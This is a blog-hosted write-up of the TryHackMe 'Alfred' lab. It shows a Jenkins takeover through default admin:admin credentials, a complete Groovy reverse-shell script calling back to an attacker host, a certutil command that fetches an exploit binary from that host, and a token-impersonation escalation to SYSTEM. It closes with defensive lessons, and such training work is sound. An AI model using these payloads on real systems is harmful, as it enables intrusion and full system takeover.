<!doctype html><html lang=en dir=auto data-theme=dark><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe: Alfred | R-Jin</title><meta name=keywords content="tryhackme,windows,easy,jenkins,privilege-escalation"><meta name=description content="Writeup for TryHackMe room Alfred - Exploiting Jenkins and Windows privilege escalation using token impersonation"><meta name=author content="Ryan Jin"><link rel=canonical href=http://localhost:1313/writeups/thm-alfred/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.e5276ca407772b54cc53aa3fea80001a6c2605108f45453b0ca91c990d0acd14.css integrity="sha256-5SdspAd3K1TMU6o/6oAAGmwmBRCPRUU7DKkcmQ0KzRQ=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/writeups/thm-alfred/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="http://localhost:1313/writeups/thm-alfred/"><meta property="og:site_name" content="R-Jin"><meta property="og:title" content="TryHackMe: Alfred"><meta property="og:description" content="Writeup for TryHackMe room Alfred - Exploiting Jenkins and Windows privilege escalation using token impersonation"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-02-12T10:00:00-05:00"><meta property="article:modified_time" content="2026-02-12T10:00:00-05:00"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Jenkins"><meta property="article:tag" content="Privilege-Escalation"><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe: Alfred"><meta name=twitter:description content="Writeup for TryHackMe room Alfred - Exploiting Jenkins and Windows privilege escalation using token impersonation"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"CTF Writeups","item":"http://localhost:1313/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe: Alfred","item":"http://localhost:1313/writeups/thm-alfred/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe: Alfred","name":"TryHackMe: Alfred","description":"Writeup for TryHackMe room Alfred - Exploiting Jenkins and Windows privilege escalation using token impersonation","keywords":["tryhackme","windows","easy","jenkins","privilege-escalation"],"articleBody":"Challenge Information Platform: TryHackMe Difficulty: Easy OS: Windows Room: Alfred Link: TryHackMe - Alfred Overview Alfred is an easy Windows machine focusing on exploiting a Jenkins instance and performing privilege escalation using Windows token impersonation techniques.\nReconnaissance Nmap Scan nmap -sC -sV -oN nmap/initial 10.10.x.x Results:\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 3389/tcp open tcpwrapped 8080/tcp open http Jetty 9.4.z-SNAPSHOT Three interesting ports:\nPort 80: IIS web server Port 3389: RDP (Remote Desktop Protocol) Port 8080: Jenkins CI/CD server Web Enumeration Port 80 - IIS Server Visiting http://10.10.x.x shows a simple Batman-themed webpage. Nothing particularly interesting in the source code.\nPort 8080 - Jenkins Navigating to http://10.10.x.x:8080 reveals a Jenkins login page.\nJenkins is a popular automation server used for CI/CD pipelines.\nDefault Credentials Trying common default credentials for Jenkins:\nUsername: admin Password: admin Success! We’re logged into Jenkins with admin privileges.\nExploitation Gaining a Reverse Shell Jenkins allows executing arbitrary commands through the Script Console, which uses Groovy scripting.\nSteps:\nNavigate to Manage Jenkins → Script Console Create a reverse shell payload Setting up a listener on our attack machine:\nnc -lvnp 4444 Using a Groovy reverse shell script:\nString host=\"10.10.x.x\"; int port=4444; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); After executing the script, we receive a connection:\nconnect to [10.10.x.x] from (UNKNOWN) [10.10.x.x] 49187 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Program Files (x86)\\Jenkins\u003e User Flag C:\\Users\\bruce\\Desktop\u003etype user.txt 79007a09481963edf2e1321abd9ae2a0 Privilege Escalation Enumeration Checking our privileges:\nwhoami /priv Output:\nPRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Disabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Disabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Disabled SeCreatePagefilePrivilege Create a pagefile Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Disabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled SeCreateSymbolicLinkPrivilege Create symbolic links Disabled SeImpersonatePrivilege is enabled! This can be exploited for privilege escalation.\nToken Impersonation Attack We’ll use a modified version of the Potato exploit family. For this machine, we’ll use the precompiled binary provided in the room.\nTransferring the exploit to the target:\n# On attack machine, start a Python HTTP server python3 -m http.server 8000 # On target machine certutil -urlcache -f http://10.10.x.x:8000/exploit.exe C:\\Windows\\Temp\\exploit.exe Running the Exploit Setting up another listener:\nnc -lvnp 5555 Executing the privilege escalation exploit:\nC:\\Windows\\Temp\u003eexploit.exe 10.10.x.x 5555 We receive a shell with NT AUTHORITY\\SYSTEM privileges!\nconnect to [10.10.x.x] from (UNKNOWN) [10.10.x.x] 49189 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami nt authority\\system Root Flag C:\\Windows\\System32\\config\u003etype root.txt dff0f748678f280250f25a45b8046b4a Solution Summary Initial Access: Default credentials on Jenkins (admin:admin) User Shell: Groovy script console in Jenkins for reverse shell Privilege Escalation: Token impersonation exploit leveraging SeImpersonatePrivilege Lessons Learned Default Credentials: Critical services like Jenkins should never use default credentials CI/CD Security: Jenkins script console with admin access provides code execution Windows Privileges: SeImpersonatePrivilege can be exploited for privilege escalation Token Impersonation: Understanding Windows token impersonation attacks is crucial for Windows security Least Privilege: Jenkins service should not run with excessive privileges Tools Used Nmap - Network reconnaissance Netcat - Reverse shell listener Jenkins Script Console - Initial exploitation Token Impersonation Exploit - Privilege escalation CertUtil - File transfer on Windows References Jenkins Security Windows Token Impersonation Potato Privilege Escalation Pwned: February 12, 2026\n","wordCount":"647","inLanguage":"en","datePublished":"2026-02-12T10:00:00-05:00","dateModified":"2026-02-12T10:00:00-05:00","author":{"@type":"Person","name":"Ryan Jin"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/writeups/thm-alfred/"},"publisher":{"@type":"Organization","name":"R-Jin","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="R-Jin (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>R-Jin</a><div class=logo-switches></div></div><ul id=menu><li><a href=http://localhost:1313/posts/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/projects/ title=Projects><span>Projects</span></a></li><li><a href=http://localhost:1313/writeups/ title=Writeups><span>Writeups</span></a></li><li><a href=http://localhost:1313/about/ title=About><span>About</span></a></li><li><a href=http://localhost:1313/cv/ title=CV><span>CV</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/writeups/>CTF Writeups</a></div><h1 class="post-title entry-hint-parent">TryHackMe: Alfred</h1><div class=post-description>Writeup for TryHackMe room Alfred - Exploiting Jenkins and Windows privilege escalation using token impersonation</div><div class=post-meta><span title='2026-02-12 10:00:00 -0500 -0500'>February 12, 2026</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>647 words</span>&nbsp;·&nbsp;<span>Ryan Jin</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-information>Challenge Information</a></li><li><a href=#overview>Overview</a></li><li><a href=#reconnaissance>Reconnaissance</a><ul><li><a href=#nmap-scan>Nmap Scan</a></li><li><a href=#web-enumeration>Web Enumeration</a></li><li><a href=#default-credentials>Default Credentials</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#gaining-a-reverse-shell>Gaining a Reverse Shell</a></li><li><a href=#user-flag>User Flag</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#token-impersonation-attack>Token Impersonation Attack</a></li><li><a href=#running-the-exploit>Running the Exploit</a></li><li><a href=#root-flag>Root Flag</a></li></ul></li><li><a href=#solution-summary>Solution Summary</a></li><li><a href=#lessons-learned>Lessons Learned</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-information>Challenge Information<a hidden class=anchor aria-hidden=true href=#challenge-information>#</a></h2><ul><li><strong>Platform:</strong> TryHackMe</li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Room:</strong> Alfred</li><li><strong>Link:</strong> <a href=https://tryhackme.com/room/alfred>TryHackMe - Alfred</a></li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Alfred is an easy Windows machine focusing on exploiting a Jenkins instance and performing privilege escalation using Windows token impersonation techniques.</p><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap-scan>Nmap Scan<a hidden class=anchor aria-hidden=true href=#nmap-scan>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sC -sV -oN nmap/initial 10.10.x.x
</span></span></code></pre></div><p><strong>Results:</strong></p><pre tabindex=0><code>PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
</code></pre><p>Three interesting ports:</p><ul><li>Port 80: IIS web server</li><li>Port 3389: RDP (Remote Desktop Protocol)</li><li>Port 8080: Jenkins CI/CD server</li></ul><h3 id=web-enumeration>Web Enumeration<a hidden class=anchor aria-hidden=true href=#web-enumeration>#</a></h3><h4 id=port-80---iis-server>Port 80 - IIS Server<a hidden class=anchor aria-hidden=true href=#port-80---iis-server>#</a></h4><p>Visiting <code>http://10.10.x.x</code> shows a simple Batman-themed webpage. Nothing particularly interesting in the source code.</p><h4 id=port-8080---jenkins>Port 8080 - Jenkins<a hidden class=anchor aria-hidden=true href=#port-8080---jenkins>#</a></h4><p>Navigating to <code>http://10.10.x.x:8080</code> reveals a Jenkins login page.</p><p><img alt="Jenkins Login" loading=lazy src=https://example.com/alfred-jenkins.png></p><p>Jenkins is a popular automation server used for CI/CD pipelines.</p><h3 id=default-credentials>Default Credentials<a hidden class=anchor aria-hidden=true href=#default-credentials>#</a></h3><p>Trying common default credentials for Jenkins:</p><ul><li>Username: <code>admin</code></li><li>Password: <code>admin</code></li></ul><p>Success! We&rsquo;re logged into Jenkins with admin privileges.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><h3 id=gaining-a-reverse-shell>Gaining a Reverse Shell<a hidden class=anchor aria-hidden=true href=#gaining-a-reverse-shell>#</a></h3><p>Jenkins allows executing arbitrary commands through the Script Console, which uses Groovy scripting.</p><p><strong>Steps:</strong></p><ol><li>Navigate to <strong>Manage Jenkins</strong> → <strong>Script Console</strong></li><li>Create a reverse shell payload</li></ol><p>Setting up a listener on our attack machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span></code></pre></div><p>Using a Groovy reverse shell script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-groovy data-lang=groovy><span class=line><span class=cl><span class=n>String</span> <span class=n>host</span><span class=o>=</span><span class=s2>&#34;10.10.x.x&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>port</span><span class=o>=</span><span class=mi>4444</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=n>String</span> <span class=n>cmd</span><span class=o>=</span><span class=s2>&#34;cmd.exe&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=n>Process</span> <span class=n>p</span><span class=o>=</span><span class=k>new</span> <span class=n>ProcessBuilder</span><span class=o>(</span><span class=n>cmd</span><span class=o>).</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>).</span><span class=na>start</span><span class=o>();</span><span class=n>Socket</span> <span class=n>s</span><span class=o>=</span><span class=k>new</span> <span class=n>Socket</span><span class=o>(</span><span class=n>host</span><span class=o>,</span><span class=n>port</span><span class=o>);</span><span class=n>InputStream</span> <span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>(),</span><span class=n>pe</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getErrorStream</span><span class=o>(),</span> <span class=n>si</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span><span class=n>OutputStream</span> <span class=n>po</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>(),</span><span class=n>so</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>();</span><span class=k>while</span><span class=o>(!</span><span class=n>s</span><span class=o>.</span><span class=na>isClosed</span><span class=o>()){</span><span class=k>while</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>po</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=n>so</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>po</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>Thread</span><span class=o>.</span><span class=na>sleep</span><span class=o>(</span><span class=mi>50</span><span class=o>);</span><span class=k>try</span> <span class=o>{</span><span class=n>p</span><span class=o>.</span><span class=na>exitValue</span><span class=o>();</span><span class=k>break</span><span class=o>;}</span><span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>){}};</span><span class=n>p</span><span class=o>.</span><span class=na>destroy</span><span class=o>();</span><span class=n>s</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
</span></span></code></pre></div><p>After executing the script, we receive a connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>connect to <span class=o>[</span>10.10.x.x<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.x.x<span class=o>]</span> <span class=m>49187</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\P</span>rogram Files <span class=o>(</span>x86<span class=o>)</span><span class=se>\J</span>enkins&gt;
</span></span></code></pre></div><h3 id=user-flag>User Flag<a hidden class=anchor aria-hidden=true href=#user-flag>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\b</span>ruce<span class=se>\D</span>esktop&gt;type user.txt
</span></span><span class=line><span class=cl>79007a09481963edf2e1321abd9ae2a0
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h3><p>Checking our privileges:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whoami /priv
</span></span></code></pre></div><p><strong>Output:</strong></p><pre tabindex=0><code>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege      Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege         Load and unload device drivers            Disabled
SeSystemProfilePrivilege      Profile system performance                Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                  Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority            Disabled
SeCreatePagefilePrivilege     Create a pagefile                         Disabled
SeBackupPrivilege             Back up files and directories             Disabled
SeRestorePrivilege            Restore files and directories             Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeDebugPrivilege              Debug programs                            Disabled
SeSystemEnvironmentPrivilege  Modify firmware environment values        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege     Force shutdown from a remote system       Disabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege Create symbolic links                     Disabled
</code></pre><p><strong>SeImpersonatePrivilege</strong> is enabled! This can be exploited for privilege escalation.</p><h3 id=token-impersonation-attack>Token Impersonation Attack<a hidden class=anchor aria-hidden=true href=#token-impersonation-attack>#</a></h3><p>We&rsquo;ll use a modified version of the <strong>Potato</strong> exploit family. For this machine, we&rsquo;ll use the precompiled binary provided in the room.</p><p>Transferring the exploit to the target:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On attack machine, start a Python HTTP server</span>
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>8000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On target machine</span>
</span></span><span class=line><span class=cl>certutil -urlcache -f http://10.10.x.x:8000/exploit.exe C:<span class=se>\W</span>indows<span class=se>\T</span>emp<span class=se>\e</span>xploit.exe
</span></span></code></pre></div><h3 id=running-the-exploit>Running the Exploit<a hidden class=anchor aria-hidden=true href=#running-the-exploit>#</a></h3><p>Setting up another listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>5555</span>
</span></span></code></pre></div><p>Executing the privilege escalation exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\T</span>emp&gt;exploit.exe 10.10.x.x <span class=m>5555</span>
</span></span></code></pre></div><p>We receive a shell with <code>NT AUTHORITY\SYSTEM</code> privileges!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>connect to <span class=o>[</span>10.10.x.x<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.x.x<span class=o>]</span> <span class=m>49189</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
</span></span></code></pre></div><h3 id=root-flag>Root Flag<a hidden class=anchor aria-hidden=true href=#root-flag>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onfig&gt;type root.txt
</span></span><span class=line><span class=cl>dff0f748678f280250f25a45b8046b4a
</span></span></code></pre></div><h2 id=solution-summary>Solution Summary<a hidden class=anchor aria-hidden=true href=#solution-summary>#</a></h2><ol><li><strong>Initial Access:</strong> Default credentials on Jenkins (<code>admin:admin</code>)</li><li><strong>User Shell:</strong> Groovy script console in Jenkins for reverse shell</li><li><strong>Privilege Escalation:</strong> Token impersonation exploit leveraging <code>SeImpersonatePrivilege</code></li></ol><h2 id=lessons-learned>Lessons Learned<a hidden class=anchor aria-hidden=true href=#lessons-learned>#</a></h2><ul><li><strong>Default Credentials:</strong> Critical services like Jenkins should never use default credentials</li><li><strong>CI/CD Security:</strong> Jenkins script console with admin access provides code execution</li><li><strong>Windows Privileges:</strong> <code>SeImpersonatePrivilege</code> can be exploited for privilege escalation</li><li><strong>Token Impersonation:</strong> Understanding Windows token impersonation attacks is crucial for Windows security</li><li><strong>Least Privilege:</strong> Jenkins service should not run with excessive privileges</li></ul><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap - Network reconnaissance</li><li>Netcat - Reverse shell listener</li><li>Jenkins Script Console - Initial exploitation</li><li>Token Impersonation Exploit - Privilege escalation</li><li>CertUtil - File transfer on Windows</li></ul><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://www.jenkins.io/doc/book/security/>Jenkins Security</a></li><li><a href=https://github.com/hatRiot/token-priv>Windows Token Impersonation</a></li><li><a href=https://github.com/ohpe/juicy-potato>Potato Privilege Escalation</a></li></ul><hr><p><strong>Pwned:</strong> February 12, 2026</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/tryhackme/>Tryhackme</a></li><li><a href=http://localhost:1313/tags/windows/>Windows</a></li><li><a href=http://localhost:1313/tags/easy/>Easy</a></li><li><a href=http://localhost:1313/tags/jenkins/>Jenkins</a></li><li><a href=http://localhost:1313/tags/privilege-escalation/>Privilege-Escalation</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=http://localhost:1313/>R-Jin</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>